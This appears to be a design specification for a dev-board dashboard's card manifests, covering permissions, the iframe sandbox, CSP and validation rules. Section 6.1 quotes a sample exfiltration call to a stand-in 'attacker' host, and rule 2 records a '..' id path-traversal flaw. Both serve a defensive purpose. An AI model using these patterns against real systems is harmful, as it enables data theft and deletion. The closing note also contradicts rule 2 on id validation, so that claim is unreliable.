> Source and revisions: this document was migrated from the predecessor project `DevBoardConsole\docs\spec\` (2026-11-12, Codex, commit `c24b084`).
> The contract layer is the authoritative documentation. It was revised by `0244852` after the migration, and the review of 2026-11-12 revised it once more
> — see `00-overview.md` section 1.2 for the per-section provenance. For the implementation see `README.md` at the repository root.
# The Card Manifest Format

> One card = one directory. `manifest.json` declares what it is, what it reads and what it writes.
> A card is a file: putting it into a directory makes it effective, editing it hot-plugs it. This is the thing an AI is best at editing.

---

## 1. What a manifest looks like

```json
{
  "apiVersion": "devboard/v1",
  "kind": "Card",

  "id": "cpu-usage",
  "name": "CPU utilisation",
  "version": "1.0.0",
  "description": "Shows the overall CPU utilisation and the utilisation per core",

  "entry": "index.html",

  "requires": {
    "tags": ["cpu.usage", "cpu.core.*.usage"],
    "actions": [],
    "min_board_pack": ">=1.0.0"
  },

  "layout": {
    "w": 3, "h": 2,
    "min_w": 2, "min_h": 1
  },

  "permissions": {
    "read": ["cpu.usage", "cpu.core.*.usage"],
    "write": []
  },

  "actions": []
}
```

---

## 2. Field by field

| Field | Required | Meaning |
|---|---|---|
| `apiVersion` | Yes | The contract version |
| `id` | Yes | The stable identifier of the card, globally unique |
| `name` | Yes | A human-readable name |
| `version` | Yes | The version of the card itself |
| `entry` | Yes | The entry HTML, relative to the card directory |
| `requires.tags` | No | The tags this card wants to read. Used for the dependency check and for the degradation hint |
| `requires.actions` | No | The actions this card wants to trigger |
| `requires.workflows` | No | The workflows this card wants to trigger (workflow packs, `05`) |
| `requires.min_board_pack` | No | The minimum board pack version required |
| `layout` | No | The grid size and the minimum size |
| `permissions.read` | Yes | The tags this card is allowed to read. Every read outside this list is refused |
| `permissions.write` | Yes | The action ids this card is allowed to trigger. Everything outside this list is refused |
| `permissions.workflows` | No | The workflow ids this card is allowed to trigger (exact ids, no wildcards ✓). Everything outside this list is refused |
| `actions` | No | The view-local actions the card declares for itself (see section 5) |

### 2.2 The inclusion relation between the patterns

Both fields support patterns, so "requires ⊆ permissions" is not string equality but
pattern coverage:

> Every entry in `requires` must be covered by some entry in `permissions`.

```
requires:   ["cpu.core.3.usage"]
permissions: ["cpu.core.*.usage"]     ← covered, so it holds
```

This rule lets a card state an exact requirement and still ask for a wider permission range. The other way
round (`requires` wide, `permissions` narrow) does not hold.

Note the cost of this rule: a card that declares `cpu.core.*.usage` gains read permission on every core.
That is no problem — read permission is low risk in itself, and the semantic tag contract guarantees that it cannot read anything belonging to another board.

### 2.3 `permissions.write` does not support patterns

`permissions.read` supports patterns, `permissions.write` supports exact action ids only.

The reason is the asymmetry of the risk: reading a `cpu.usage` has no side effect, writing an action changes the board.
Patterns widen the scope of an authorisation, which is convenient for reading and dangerous for writing.

So `permissions.write: ["backlight.*"]` is illegal, and the validator reports an error.

`requires.actions` likewise uses exact ids (an action id itself carries no wildcard convention).

### 2.4 The effective write permission

The effective write permission is `permissions.write` ✓ — exactly what the manifest says ✓.

> Changed on 2026-11-16 (the user's own words: "the board description file
> has the final say", "click a card and it runs" ✓):
> → There is no longer a second record of "who authorised what" ✓ (writing the same thing down twice ✗ — that eventually disagrees with itself ✗).
> → What the board accepts is decided by the board pack ✓ (the board pack has the final say ✓);
>   what the card can do is decided by its manifest ✓.
> → The session layer keeps "anything outside the declaration is denied" ✓ — a card that says one thing and does another is not allowed ✓.

The same holds for workflows (`05` section 7.6 ✓):

```
effective workflow permission = permissions.workflows
```

→ A workflow has no second gate ✓ (removed on 2026-11-16 ✓):
the existence of a workflow pack is the statement in itself ✓ (the user's own words: "the existence of a workflow is itself the explanation" ✓)
→ the gate is the unified permission area in the settings ✓ (`05` section 7.2 ✓): the switch on the workflow row ✓
→ that row prints every command of every step ✓ (`05` section 7.4 ✓ — the switch is not "opening one file name" ✓).

Installing a card no longer asks for "consent" ✓ (`04` section 2.3 ✓):
→ an action to write that the board pack does not have → do not install it ✓ (the board pack has the final say ✓);
→ all of them are there → install it directly ✓ (one click is the consent ✓).

But "who may write to a board" is decided by the one table in the settings ✓ (the unified permission area ✓):
→ a card writing the board: forbidden by default ✓ (the host cannot verify "a human clicked the button on the card" ✗ → do not grant it by default ✓)
→ a card triggering a workflow: allowed by default ✓ (the gate is the switch on that row in the settings ✓ — the existence of a workflow pack is the statement in itself ✓)
→ an agent: allowed by default ✓ for the operations that are **not** dangerous ✓ — **dangerous actions are off by default for both executors** ✓ (the settings page has a switch for each of them ✓)
→ to change it, change that switch in the settings ✓ (once ✓ · no more dialog ✓).

### 2.5 The schema of the manifest is closed

An unknown field is always an error, at every level.

This is the same rule as the one for board packs, for the same reason: a field that is silently ignored is a field that was typed wrong.

```
"permissions": { "read": [...], "write": [...], "network": true }
                                       ^^^^^^^^ an error, not ignored
```

This rule is the enforcer of the promise in section 6, "v1 has no `permissions.network`".
Without it a card could declare a field the runtime does not understand and believe that it has network access —
while in fact it has none, or worse, the runtime handles it in some other way.

| Layer | Closed |
|---|---|
| The top level | Yes |
| `requires` | Yes |
| `permissions` | Yes |
| `layout` | Yes |
| `actions[]` | Yes |

---

## 3. The permission model

### 3.1 Why there are two layers

A card runs in a sandbox (an iframe plus a whitelist API), but the sandbox only guarantees that the card cannot take the workbench down with it. It does not guarantee that the card will not tamper with the board.

Two things have to be kept apart:

| Protection | What it protects against | Means |
|---|---|---|
| The code sandbox | a bad card taking the workbench down, reading the files of the host | an iframe plus a whitelist API plus no Node integration |
| The action permission | the card writing to the board | `permissions.write` (the declaration is the permission ✓) plus the grading and the floor of the board pack ✓ |

A card that can read `cpu.usage` is reading, which is not dangerous. A card that can write `/sys/...` is writing, which needs an authorisation. Read permission is declared with tag names, write permission with action ids — an action id is coarser than a tag name, so write permission is the stricter one by nature.

### 3.2 Grading

The card side reuses the two grades of the board pack (`reversible` / `destructive`); the card only declares
"which grade of actions I want to use" — which grade is actually in force is decided by the board pack ✓ (section 5.1),
the card only declares "I want to use this action":

```json
"permissions": {
  "read": ["cpu.usage"],
  "write": ["backlight.set"]
}
```

> There are only two grades. An early version wrote three (`read` / `reversible` / `destructive`),
> which conflicted with section 4.2 of `spec/02`; it has been unified to the wording of the contract: a read goes through a tag, it is not an action.

There is no authorisation process on the card side ✓ (changed on 2026-11-16 ✓):

1. The effective write permission is `permissions.write` ✓ — exactly what the manifest says ✓.
2. Any action outside the declaration is denied ✓ (the session layer keeps it ✓ — a card that says one thing and does another is not allowed ✓).
3. Whether the action is in the board pack is decided by the host as well ✓ (when it is not → `not_found` ✓).
4. The danger grade and the floor ✓ (section 5.2 of `02-board-pack.md`) have already been checked on the board pack path ✓
   (action ✓ rule 16 ✓ · reader ✓ rule 28 ✓) → the card path does not check them again ✓
   (a second check would have nobody to approve it ✗ — there is no such gate in the interface ✗ → asking would be asking into the void ✗).

`guard` is still the boundary ✓ (section 5.5 of `02-board-pack.md` ✓): a value the card passes that is outside the `guard` →
refused ✓ (not let through ✓) — the `guard` gives "how far this action may change things" a definite meaning ✓.

> The agent path does not ask either ✓ (section 2.4.1 of `04` ✓): **there is no confirmation chain any more** ✓ —
> an agent cannot click a button ✓ → **the row for that action in the unified permission area is the gate** ✓
> (dangerous actions are **off by default** ✓ → turning one on is the informed consent ✓).

A read is not an action. A read goes through a tag, `permissions.read` needs no authorisation process — reading a
`cpu.usage` has no side effect, there is no reason to ask the user. The board pack has no action with `danger: readonly` either:
an action is always a write.

### 3.3 A card cannot raise its own permissions

A card cannot request new permissions at runtime. The permissions are what its manifest declares ✓ (section 2.4 ✓).
A card that wants more has to change the manifest (and that goes through a new installation ✓ — it is not a runtime escalation ✓).

Changing the manifest → the permission set changes with it ✓: the instance id contains a fingerprint of the contents of the card directory ✓
(`manifest.json` included ✓) → a change replaces the instance ✓ → a new session computes the permissions from the new declaration ✓.
→ A card cannot slip a dangerous action in between two hot reloads and then keep using the old authorisation ✗
— because there is no old authorisation left to use ✓.

---

## 4. The read side: how a card obtains data

A card does not touch the connection layer. The runtime gives it a controlled API:

```js
// available inside the card iframe
const value = await cockpit.tags.get("cpu.usage");
// => { value: 37.2, unit: "percent", status: "ok", at: 1762910000123 }

cockpit.tags.subscribe("cpu.usage", (v) => { /* on every refresh */ });
```

The runtime guarantees:

- It returns only the tags listed in `permissions.read`
- What it returns is a stateful value (the five states of `01`), not a bare number
- The subscription is pushed on the refresh cycle of the reader, not polled by the card

A card cannot poll by itself. A card that polls by itself forks an adb shell per card — the board then looks 100% busy, and the load multiplies with the number of cards. The runtime is the only poller, the cards are subscribers.

> This section and section 7 are about the same thing. The complete list of the API, its signatures and its error semantics are in section 7,
> which is the only place they are defined; this section keeps three principles, so that one set of API does not end up with two descriptions.
> (Historically this section and section 7 were two word-for-word copies; changing one and forgetting the other made them drift.)

---

## 5. The write side: the control loop

### 5.1 The controls a card declares

```json
"actions": [
  {
    "id": "toggle-npu",
    "label": "NPU pipeline switch",
    "target": "npu.pipeline.toggle",
    "params": { "enabled": { "type": "boolean" } }
  }
]
```

The fields of each entry in `actions[]`:

| Field | Required | Meaning |
|---|---|---|
| `id` | Yes | The action id inside the card, globally unique (the card's own namespace) |
| `label` | Yes | A human-readable name |
| `target` | No | An action id of the board pack. Present = a board action, absent = a view-local action |
| `params` | No | The parameter schema, the same shape as the `params` of a board pack (section 4.3 of `02`) |

The presence of `target` decides the category of the action:

| | A view-local action (no `target`) | A board action (a `target`) |
|---|---|---|
| What it is | an operation inside the card | a write the board accepts |
| Example | switching the display mode of the chart | `backlight.set` |
| Permission | no authorisation needed (it does not touch the board) | needed (section 3.2) |
| `danger` / `readback` | not applicable | decided by the board pack |
| Validation | rule 12 in section 9 | rule 7 in section 9 (`target` has to be in `permissions.write`) |

A card does not declare `danger`. The danger grade is decided by the board pack ✓ — the board knows that restarting itself is destructive,
the card does not. A `danger` field on a card is refused by the validator (the schema is closed, section 2.5).

The same holds for `readback`: the readback is defined by the action of the board pack, and the runtime follows the board pack.
A card that declares its own `readback` conflicts with the board pack, and the board pack wins, because it is the layer closest to the board.

> This rule contradicted itself once: an early version said both that "a view-local action needs no authorisation",
> and, in the validation rules, that `actions[].target` has to appear in `permissions.write` —
> so a view-local action was forced to authorise a board action it did not have.
> The rule now branches on the presence of `target`, and the two kinds of action go through their own validation.

### 5.2 The four steps of the loop

The complete flow of a toggle button in a card:

```
the user clicks
   ↓
the card calls cockpit.actions.invoke("toggle-npu", {enabled: true})
   ↓
the runtime checks: ① is the action in permissions.write?
           ② is the row for that action in the unified permission area open for this executor?
           ③ do the parameters fall inside the guard domain of the action? (outside it, the action is refused)
           ④ does this action exist in the board pack?
   ↓
the command runs → the readback is taken
   ↓
the real state that was read back is returned to the card
   ↓
the card renders the button from the readback value (not from what the user clicked)
```

The readback is mandatory. After the action has run, the runtime takes the value according to `readback` and returns it as the result of the action. The card must render from the returned value and must not update optimistically on its own.

```js
const r = await cockpit.actions.invoke("toggle-npu", { enabled: true });
// r = { ok: true, readback: { value: true, status: "ok" } }
button.setState(r.readback.value);   // from the readback value
```

### 5.3 A failed readback

The command returned, but the state did not change (for example the service on the board did not come up):

```js
// r = { ok: false, reason: "readback_mismatch", expected: true, actual: false }
```

The card should show "the command was sent, the effect is not confirmed" and keep the actual value. It is not allowed to show it as switched on.

This is the boundary between a cockpit and a remote control — a remote control shows what you pressed, a cockpit shows what the board is actually doing.

### 5.4 View-local actions versus board actions

See the comparison table in section 5.1 (the two kinds of action are branched by the presence of `target`).

---

## 6. The sandbox

A card runs in an iframe.

| Rule | Content |
|---|---|
| The location | an independent iframe, `sandbox="allow-scripts"` (without `allow-same-origin`) |
| The API | only the whitelisted `cockpit.*` methods |
| The network | forbidden. It is closed by a CSP injected by the host (section 6.1), and v1 cannot ask for it. Networking requires a contract version bump |
| The storage | it may only write its own namespace (layout, preferences), through `cockpit.storage.*` (section 6.2) |
| The files | it can neither read nor write the file system of the host (apart from the relative resources in its own directory and the storage interface of section 6.2) |
| A crash | one card crashing does not affect the other cards, nor the workbench |

v1 has no field like `permissions.network`. Not declared means not there — this rule does not need a field to
express itself, because a card cannot declare it.

This is not laziness, it is a deliberate trade-off: a card written by an AI that can reach the network at will can send the data on the user's board
anywhere. v1 would rather let the card do nothing at all than open that door.

To open it for real:

1. The contract version is bumped and an explicit field is added;
2. Installing the card asks for a separate authorisation (not mixed with the action authorisation);
3. The authorisation is bound to specific domains, not to "the network is allowed".

The sandbox of a card and the process model of the host are two different things. A card runs in an iframe and needs an embedded web runtime
(Electron's `<webview>` / `BrowserView`, or the system WebView2, will do); this does not change the contract itself,
but it does affect the choice of how the host implements it. This round does not settle that point.

This sandbox choice brings two things that have to be written down (2026-11-14):

1. Cards cannot see each other. Every iframe is an independent opaque origin — they are of different origins,
   and none of them can read the DOM, the storage or the cookies of another.
   (That is also why they cannot reach the storage of the host: the `localStorage` of a card throws a `SecurityError`
   straight away. That is the premise of section 6.2, which is why the host has to hold the storage on behalf of the cards — it is not a compromise.)
2. The preload does not reach the iframe. The preload of the host is attached to the window only, and a child iframe has none —
   so `cockpit.*` cannot be handed in through `contextBridge`; it has to be implemented by the host injecting a bridge script
   (served from the same origin) (section 7.7).

### 6.1 How the network is really closed

The `sandbox` attribute does not restrict the network. Leaving out `allow-same-origin` only keeps the origin, the DOM and the storage of the host
away from the card; inside its own opaque origin the card can still `fetch('https://attacker/?d=' + data)`,
`new WebSocket(...)`, `navigator.sendBeacon(...)`, `<img src="https://...">`.

So the promise "no network in v1" has to be enforced by the host, specifically by injecting a CSP response header:

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self' data:;
  connect-src 'none';
  form-action 'none';
  frame-src 'none';
  base-uri 'none';
```

| Directive | Value | Why |
|---|---|---|
| `default-src` | `'none'` | everything is closed by default, opened item by item |
| `script-src` | `'self'` | the card may only run scripts from its own directory |
| `connect-src` | `'none'` | this closes `fetch` / `XHR` / `WebSocket` / `EventSource` |
| `img-src` | `'self' data:` | only local and inline `data:` are allowed, which closes the `<img>` exfiltration channel |
| `form-action` / `frame-src` / `base-uri` | `'none'` | they close form exfiltration, nested frames and the rewriting of `<base>` |

The CSP is part of the contract: the host must inject it, and the card cannot override it
(`connect-src` cannot be relaxed by the card). The host injects the CSP when it answers `cockpit://card/...`,
not through a `meta` tag in the card directory — the CSP in a `meta` tag cannot restrict itself,
and the card can delete it.

What a violation of the CSP looks like: the CSP violation of the browser is recorded in the card runtime log (visible in
`get_card_runtime_log` in section 2.3 of `04`), so the agent can see that the card tried to reach the network.

### 6.2 How the storage is honoured

The contract promises that a card may only write its own namespace, but in an iframe without `allow-same-origin`,
`localStorage` / `sessionStorage` / `IndexedDB` all throw a `SecurityError`
(an opaque origin has no storage). So the storage has to be held on behalf of the card by the host and accessed through the whitelist API:

| Method | Signature | Description |
|---|---|---|
| `cockpit.storage.get(key)` | `→ Promise<any>` | reads one key of its own namespace; `undefined` when it does not exist |
| `cockpit.storage.set(key, value)` | `→ Promise<void>` | writes one key. `value` has to be JSON serialisable |
| `cockpit.storage.remove(key)` | `→ Promise<void>` | removes one key |
| `cockpit.storage.keys()` | `→ Promise<string[]>` | lists all the keys of its own namespace |
| `cockpit.storage.clear()` | `→ Promise<void>` | empties its own namespace |

The rules:

| Item | Rule |
|---|---|
| The namespace | one per card, separated by the card id. A card can only see its own |
| Where it is stored | `cards/<card-id>/storage.json` under the data directory of the host, written by the host |
| The type of the value | only JSON serialisable values (string, number, boolean, null, array, object) |
| The limit per key | 64 KB; the limit of the whole namespace is 1 MB. Going over it reports `quota_exceeded` |
| The name of a key | must not begin with `__` (reserved for the host) |
| The lifecycle | the data is kept when the card is uninstalled (it is still there when it is installed again), unless the user clears it explicitly |
| The isolation | the cards cannot see each other; the host does not read the business data of a card, it only guarantees the isolation and the quota |

A card cannot reach the storage of the host. It cannot even touch `localStorage` (opaque origin),
the only thing it can reach is the five methods above.

The controlled interface for the layout storage is this set. An early version mentioned the phrase in section 6 but never defined it;
it now has a definite landing place: `cockpit.storage.*`.

### 6.3 The CSS variables a card may rely on

A card must not hard-code colours (the same principle as the network, the storage and the files above):
it may only use the CSS variables injected by the host. Which variables the host injects is part of the contract:

```
--cockpit-bg / --cockpit-bg-elevated / --cockpit-border
--cockpit-text / --cockpit-text-dim / --cockpit-text-faint
--cockpit-accent / --cockpit-accent-2
--cockpit-ok / --cockpit-warn / --cockpit-danger / --cockpit-unavailable
--cockpit-radius / --cockpit-font-mono / --cockpit-font-ui
```

| Rule | Content |
|---|---|
| The names and their meanings are the contract | a card may rely on the 15 above; renaming them requires a bump of `apiVersion` |
| The values are not the contract | the values come from the host per skin (one set for the dark skin, one for the light one). Both skins have to provide all 15 |
| The host may add more | an implementation may provide more variables, but a card may not rely on one that is not written here |
| The semantic colours correspond to the five states of a tag | `--cockpit-ok` / `--cockpit-warn` / `--cockpit-danger` / `--cockpit-unavailable` carry a meaning: `unavailable` says "this board does not offer this capability", and reading nothing would be turning "unavailable" into "ok" |

> Why the list belongs to the contract: a card is written by an AI, it needs a list of what it may rely on,
> otherwise a change of the host version leaves it guessing — and it will not guess, it will hard-code.
> The shape and the values are in the card HTML API section.

---

## 7. The card API

A card does not touch the connection layer. The runtime gives it a controlled API:

```js
// available inside the card iframe
const value = await cockpit.tags.get("cpu.usage");
// => { value: 37.2, unit: "percent", status: "ok", at: 1762910000123 }

cockpit.tags.subscribe("cpu.usage", (v) => { /* on every refresh */ });
```

### 7.1 Read

| Method | Description |
|---|---|
| `tags.get(name)` | takes the current value of a tag |
| `tags.subscribe(name, cb)` | subscribes to the later values of a tag |
| `tags.subscribePattern(pattern, cb)` | subscribes to a pattern, for example `cpu.core.*.usage` |
| `tags.list()` | lists all the tags that can be read at the moment, with their states |

The runtime guarantees:

- It returns only the tags listed in `permissions.read` (a pattern matches by pattern, see section 2.2)
- What it returns is a stateful value (the five states of `01`), not a bare number
- The subscription is pushed on the refresh cycle of the poll group, not polled by the card

On pattern subscriptions: what a card writes in its `requires` is a pattern (`cpu.core.*.usage`),
because the concept "the utilisation per core" does not care how many cores there are. So the subscription supports patterns too,
and pushes each instance to the card as it appears (`cpu.core.7.usage` appears on a board with 8 cores).

### 7.2 Degradation signals

How does a card know that a tag is missing? There are three signals, and all three are needed:

| Signal | Use |
|---|---|
| `tags.get(name)` returns `status: "unavailable"` | an active query |
| `tags.subscribePattern` stops pushing that instance | the instance is gone |
| `cockpit.degradation()` | lists all the missing or degraded tags of this card with their reasons |

The third one is for a card that has to write "unavailable · missing cpu.usage" in the interface.

### 7.3 Write

```js
const r = await cockpit.actions.invoke("toggle-npu", { enabled: true });
// r = { ok: true, readback: { value: true, status: "ok" } }
```

See section 5.

### 7.4 Storage

See section 6.2. Five methods: `get` / `set` / `remove` / `keys` / `clear`.

### 7.5 Logging

| Method | Signature | Description |
|---|---|---|
| `cockpit.log(level, message)` | `level ∈ {error, warn, info}` | writes one entry to the card runtime log |

The card runtime log is the "eyes for the agent's own testing" (section 1.2 of `04`),
`get_card_runtime_log(card_id)` reads the entries the card has written.
So `log` has to exist, and the card has to be able to write to it.

### 7.6 Notifications

| Method | Signature | Description |
|---|---|---|
| `cockpit.notify(title, body)` | — | shows a lightweight notification in the host (it does not ask the user for an answer) |

A notification is not an authorisation ✓ — it shows something, it grants nothing ✓.
The click on the button of the card is the "a human clicks in the GUI" moment ✓ (section 2.4 of the contract ✓) —
but the card cannot pop up an "are you sure" for itself and let itself through ✓
(the host cannot tell "the human pressed the button" from "the card's own script called the same API" ✓ —
**that is why the write side of a card is off by default** ✓ · section 2.4 ✓).

---

## 7.7 The complete API (one table)

This is the only place the API is defined. Section 4 and sections 7.1–7.6 are about it.

| Method | Category | Permission source |
|---|---|---|
| `cockpit.tags.get(name)` | read | `permissions.read` |
| `cockpit.tags.subscribe(name, cb)` | read | `permissions.read` |
| `cockpit.tags.subscribePattern(pattern, cb)` | read | `permissions.read` |
| `cockpit.tags.list()` | read | `permissions.read` |
| `cockpit.degradation()` | read | none (it returns the degradation information of this card only) |
| `cockpit.capabilities()` | read | none (it returns the information of this host only) |
| `cockpit.actions.invoke(id, params)` | write | `permissions.write` |
| `cockpit.workflows.list()` | read | none (it lists only the workflows that are in the registry — there is no longer a layer of "the ones the user approved") |
| `cockpit.workflows.run(id, inputs)` | write | this id is in `permissions.workflows` ✓ and the row in the permission area is on ✓ |
| `cockpit.workflows.status(runId)` | read | the same (the card side is a reduced projection ✓ — section 8.B.B5 of `05` ✓) |
| `cockpit.bootLog.capture()` | workflow | `permissions.workflows` must contain `boot-log.capture` and the permission-area switch must be on (SPEC-D31) |
| `cockpit.bootLog.latest()` | workflow | the same permission — the latest serial capture stored on the host |
| `cockpit.storage.get/set/remove/keys/clear` | storage | none (limited to the namespace of this card) |
| `cockpit.log(level, message)` | logging | none |
| `cockpit.notify(title, body)` | notification | none |

A card has no "cancel the workflow" method ✓ (2026-11-15, following section 8.A.A4 of `05`):
whether to stop is a judgement of the human ✓ — the permissions of a card are granted per method ✓,
and "stop somebody else's run" is on no permission item ✓ → to have it, a new permission has to be added ✓,
and a new permission should not be added in passing by the workflow round ✓.

The naming prefix is uniformly `cockpit.*`, and the method names are in lower camel case.
(The names `getTag / subscribeTag / setAction / log / notify / listTags` are an early spelling that was deprecated; the table above is the only one ✓)

No method throws: on failure it returns `{ ok: false, reason }`
(the common convention of section 4 of `04`). `tags.get` is the exception — it returns a stateful value,
and when it cannot read, that is `{ value: null, status: "unavailable" }`, not an exception.

A method that this host does not implement returns `{ ok: false, reason: 'unknown_method' }` when it is called
(2026-11-14). `unknown_method` does not go into the tag reason table of section 2.1.1 of `01` —
that table is about the reasons of a reading; here it is about a method that does not exist.
A card that wants to know what the host supports asks `capabilities()` first:

```js
const caps = await cockpit.capabilities();
// { apiVersion: 'devboard/v1',
//   methods: ['capabilities', 'tags.get', 'tags.subscribe', …],
//   connection: { label: 'Board · ADB', transport: 'adb' },
//   tags: ['cpu.usage', 'mem.usage', …] }   ← the ones this card can read
```

| Field | Content |
|---|---|
| `apiVersion` | The contract version |
| `methods` | The names of the methods this build actually implements (not the complete set of the contract) |
| `connection` | The current connection context (it does not carry `connectionId` — there is no such word in the card code, see section 7.8) |
| `tags` | The list of the tags this card can read (already filtered by `permissions.read`) |

> Why it exists: a card is written by an AI, it has to know what the host supports —
> otherwise it can only hard-code the assumption that `cockpit.tags.get` is always there, and once the host version changes it has to guess with try/catch,
> and a card that runs in a sandbox gets no hint at all when it guesses wrong.

### 7.8 The connection context (implicit scope)

The card API takes the connection context injected by the host as an implicit scope.

| Item | Rule |
|---|---|
| The name of a tag | inside the card API it is always the global name without a connection prefix (`cpu.usage`, not `board1.cpu.usage`) |
| Where the context comes from | the connectionId of the instance of the card, injected by the host when it creates the iframe |
| Where the binding happens | in the layout layer: a layout cell records `(cardId, connectionId)` |
| The manifest | carries no connection — the card declares capabilities, not a destination |

Why: one card can have an instance on each of several connections, sharing the same code directory and the same authorisation.
There is no `connectionId` in the card code — the host is the one that translates "which board this instance looks at" into
a `(connectionId, tag)` lookup in the TagStore.

The multi-board prefix problem is therefore isolated in the resolution layer of the host:
when multiple boards are supported in the future, the prefix only appears inside the host and never enters the card API or the manifest.

---

## 8. The directory layout

```
cards/
  cpu-usage/
    manifest.json
    index.html
    card.js            # optional
    style.css          # optional
  npu-control/
    manifest.json
    index.html
```

One card per directory. `entry` points at the entry file, the other files are loaded by the card itself as it needs them (same directory, relative paths).

---

## 9. The validation checklist

`validate_card(path)` has to check:

| # | Rule |
|---|---|
| 1 | `apiVersion` is a known version |
| 2 | `id` is globally unique, does not collide with an installed card, and **is a name of letters, digits and hyphens** (`^[a-z0-9][a-z0-9-]{0,63}$`) | The id is **the name of the card's directory** ✓ → the host builds a path from it ✓ → an id that may carry `..` ✓ is **a deletion outside the card root** ✓ (found on 2026-11-21 ✓: `install_card` deleted the user data directory because the manifest said `"id": ".."` ✓) → the shape is closed ✓ (decision record SPEC-D32 ✓) |
| 3 | `requires` ⊆ `permissions` (a wish must not exceed the authorisation, judged by pattern coverage, section 2.2); `requires.workflows` ⊆ `permissions.workflows` (exact ids ✓) |
| 4 | every tag name in `permissions.read` matches the core vocabulary or falls under `custom.*` |
| 5 | every action id in `permissions.write` exists in the board pack of the current connection (this check is skipped when the board cannot be reached, and marked "not verified") |
| 6 | no wildcards are allowed in `permissions.write` (section 2.3) |
| 7 | an entry in `actions[]` that has a `target` must have that `target` in `permissions.write` |
| 8 | `layout.w/h` are within the legal range, `min_w/min_h` ≤ `w/h` |
| 9 | the `entry` file exists |
| 10 | the manifest is valid JSON and no level has an unknown field (this stops a mistyped field from being ignored, section 2.5) |
| 11 | the card does not declare `danger` / `readback` (those two belong to the board pack, section 5.1) |
| 12 | an entry in `actions[]` that has no `target` is a view-local action, and it must not appear in `permissions.write` |
| 13 | the `type` of `actions[].params` has to be one of the closed values (section 4.3 of `02`); a `string` has to have `maxLength` |
| 14 | every id in `permissions.workflows` has to be free of wildcards (the same as section 2.3 ✓), and it has to be a workflow that is already declared in the host (rule 6 of section 9 of `05` ✓) |

> **The fourteen rules are what `validate_card` checks** ✓ — **nothing else** ✓.
>
> **The id of the card is not among them** ✓ — and it does not have to be ✓:
> on the host side everything is indexed by the **directory name** ✓ (the registry ✓ · `uninstall_card` ✓ ·
> `get_card_runtime_log` ✓ · the layout ✓) →
> and the host **installs a card under the id its manifest declares** ✓ →
> **so after an install the two are the same string** ✓.
> → A card that is **dropped into the cards directory by hand** keeps its directory name ✓ →
> **then the two can differ** ✓ → `list_cards` gives both fields ✓
> (`id` = the directory name ✓ · `manifest_id` = the one the manifest declares ✓) →
> the agent has to see the difference ✓ (section 2.2 of `04` ✓).

